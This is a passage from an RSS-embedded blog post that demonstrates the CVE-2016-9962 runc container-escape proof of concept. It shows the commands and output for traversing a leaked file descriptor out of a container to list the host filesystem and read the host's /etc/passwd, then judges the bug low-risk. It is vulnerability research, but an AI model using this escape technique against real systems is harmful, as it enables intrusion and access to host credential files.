&lt;li&gt;&lt;p&gt;In above case, check /proc/6/fd by ls command. You see path as fd/4;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -la /proc/6/fd/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;total 0
dr-x&amp;mdash;&amp;mdash;    2 root     root             0 Jan 16 06:43 .
dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
l-wx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
/ #&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check &amp;ldquo;/proc/6/fd/4/../../..&amp;rdquo; by ls command. You can see parent(host) / file
system;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -l /proc/6/fd/4/../../..
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;total 64
lrwxrwxrwx    1 root     root             7 Feb  3  2016 bin -&amp;gt; usr/bin
dr-xr-xr-x    6 root     root          4096 Jan 16 00:07 boot
drwxr-xr-x   19 root     root          3840 Jan 16 05:57 dev
drwxr-xr-x  130 root     root         12288 Jan 16 05:40 etc
drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;You can also read /etc/passwd by using &amp;ldquo;cat /proc/6/fd/4/../../../etc&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # cat /proc/6/fd/4/../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Now we could see that CVE-2016-9962 PoC is successfull even if SELinux is
enforcing. But we think this vulnerability is not critical because;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The race window is quite narrow(then we needed to modify runc source.)&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;We also need to add &amp;ldquo;CAP_SYS_PTRACE&amp;rdquo; on the container(it is removed in defau
lt.)&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>